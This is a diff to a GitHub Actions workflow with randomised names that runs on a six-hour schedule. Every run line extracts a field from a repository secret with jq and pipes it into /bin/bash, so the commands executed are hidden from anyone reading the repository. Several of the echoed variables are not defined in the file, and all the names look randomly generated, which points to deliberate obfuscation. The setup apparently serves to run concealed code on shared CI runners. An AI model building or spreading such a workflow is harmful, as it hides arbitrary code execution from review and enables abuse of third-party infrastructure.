@@ -3,18 +3,19 @@ name: zhengcunzai3456
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 4/6 * * *'
-
-jobs:  # 18245
+    - cron: '7 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: zhengcunzai3456
         env:
-          wuuzm04877: ${{ secrets.wuuzm04877 }}
+          ascd045: ${{ secrets.ascd045 }}
         run: |
-          echo $wuuzm04877 | jq -r .xjhe1 | /bin/bash
-          echo $a567 | jq -r .ussa497 | /bin/bash
-          echo $z3 | jq -r .l4 | /bin/bash
+          echo $ascd045 | jq -r .e0762 | /bin/bash
+          echo $bnq337 | jq -r .cyleg7884 | /bin/bash
+          echo $e2717 | jq -r .ezy1603 | /bin/bash
+          echo $olbxj88765 | jq -r .flrq6742 | /bin/bash
+          echo $ni6308 | jq -r .iihrx03 | /bin/bash
 
